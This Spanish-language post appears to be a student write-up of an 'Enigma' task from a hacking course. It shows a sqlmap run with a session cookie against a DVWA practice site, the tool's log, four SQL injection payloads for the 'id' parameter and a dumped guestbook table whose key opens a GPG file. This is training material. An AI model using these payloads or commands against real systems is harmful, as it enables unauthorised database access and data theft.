---
title: "#moocHackingMU - Enigma"
date: '2016-09-25 11:09:00'
layout: post
tags:
- moocHackingMU
---
## Enigma

> Para resolver el enigma tenéis que poner en práctica los conocimientos adquiridos en las tareas anteriores. En primer lugar debes descarga el archivo de texto Enigma.txt.gpg. En este archivo tienes la información que buscas. Está cifrado con un protocolo simétrico, así que necesitas la clave con la que ha sido cifrado. Para conseguir la clave, debes acceder a http://pruebas.euskalert.net y demostrar las destrezas adquiridas en tareas anteriores. Yoda te da una pista importante:

![](http://i.imgur.com/8lXXPO9.png)

Descarga: [Enigma.txt.gpg](https://www.dropbox.com/s/npt7oy23xliuoef/Enigma.txt.gpg?dl=0)

Usando la misma técnicas que usamos en [la tarea 2 de la segunda unidad](https://mrpnkt.github.io/2016/moochackingmu-semana-2-tarea-2/) accedemos a la base de datos usando la herramienta sqlmap:

```bash


$ sqlmap --url="http://pruebas.euskalert.net/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=p8s562714hqrcb1afp94de9ss6;security=low" --dbms=mysql -D dvwa -T guestbook --dump --random-agent

         _
 ___ ___| |_____ ___ ___  {1.0.8.2#dev}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:31:44

[00:31:44] [INFO] fetched random HTTP User-Agent header from file '/opt/sqlmap/txt/user-agents.txt': 'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.2 Safari/532.0'
[00:31:44] [INFO] testing connection to the target URL
[00:31:45] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[00:31:45] [INFO] testing if the target URL is stable
[00:31:45] [INFO] target URL is stable
[00:31:45] [INFO] testing if GET parameter 'id' is dynamic
[00:31:45] [WARNING] GET parameter 'id' does not appear dynamic
[00:31:46] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[00:31:46] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting attacks
[00:31:46] [INFO] testing for SQL injection on GET parameter 'id'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[00:31:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:31:50] [WARNING] reflective value(s) found and filtering out
[00:31:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[00:32:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[00:32:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)'
[00:32:26] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)' injectable (with --not-string="Me")
[00:32:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[00:32:26] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING clause (BIGINT UNSIGNED)'
[00:32:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[00:32:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING clause (EXP)'
[00:32:27] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[00:32:27] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE, HAVING clause (JSON_KEYS)'
[00:32:27] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[00:32:27] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[00:32:27] [INFO] testing 'MySQL inline queries'
[00:32:28] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[00:32:28] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[00:32:28] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[00:32:28] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[00:32:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[00:32:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[00:32:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[00:32:39] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
[00:32:39] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[00:32:39] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[00:32:39] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[00:32:40] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[00:32:40] [INFO] target URL appears to have 2 columns in query
[00:32:41] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[00:32:41] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval

sqlmap identified the following injection point(s) with a total of 210 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)
    Payload: id=1' OR NOT 9103=9103#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 5630 FROM(SELECT COUNT(*),CONCAT(0x717a706a71,(SELECT (ELT(5630=5630,1))),0x7162716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- ICDp&Submit=Submit

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=1' AND SLEEP(5)-- emeA&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x717a706a71,0x4748414a4a496d5353785457546265566e764b4f66667762744a596e6775647876554f6856436b68,0x7162716a71)#&Submit=Submit
---
[00:35:04] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8.0 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0
[00:35:04] [INFO] fetching columns for table 'guestbook' in database 'dvwa'
[00:35:05] [INFO] fetching entries for table 'guestbook' in database 'dvwa'
[00:35:05] [INFO] analyzing table dump for possible password hashes
Database: dvwa
Table: guestbook
[7 entries]
+------------+---------------------+------------------------------------------------------------------------------------------------+
| comment_id | name                | comment                                                                                        |
+------------+---------------------+------------------------------------------------------------------------------------------------+
| 1          | test                | This is a test comment.                                                                        |
| 2          | Obi-Wan Kenobi      | These aren't the droids you'r looking for...                                                   |
| 3          | Yoda                | The key is "use the force", Luke.                                                              |
| 4          | Anonymous bystander | Han Solo shot first!                                                                           |
| 5          | Count Dooku         | Master Kenobi, you disappoint me. Yoda holds you in such high steem. Surely you can do better! |
| 6          | Darth Maul          | At last we will reveal ourselves to the Jedi. At last we will have revenge.                    |
| 10         | Admiral Ackbar      | Its a trap!                                                                                    |
+------------+---------------------+------------------------------------------------------------------------------------------------+

[00:35:05] [INFO] table 'dvwa.guestbook' dumped to CSV file '/home/anti/.sqlmap/output/pruebas.euskalert.net/dump/dvwa/guestbook.csv'
[00:35:05] [INFO] fetched data logged to text files under '/home/anti/.sqlmap/output/pruebas.euskalert.net'

[*] shutting down at 00:35:05

```

Para confirmar el típo de archivo:

```bash
$ file Enigma.txt.gpg

Enigma.txt.gpg: GPG symmetrically encrypted data (CAST5 cipher)
```

Descifrar:

```bash
$ gpg --output enigma.txt --decrypt Enigma.txt.gpg

gpg: datos cifrados CAST5
gpg: cifrado con 1 frase contraseña
gpg: ATENCIÓN: la intgridad del mensaje no está protegida

```

Visualizar contenido: 

```bash

$ cat enigma.txt

¡Enhorabuena! Has resuelto el enigma... ya puedes solicitar audiencia con el Consejo Jedi:
https://www.facebook.com/groups/xxxxxxxxxxxxxxxxxxxxxxx/

``````

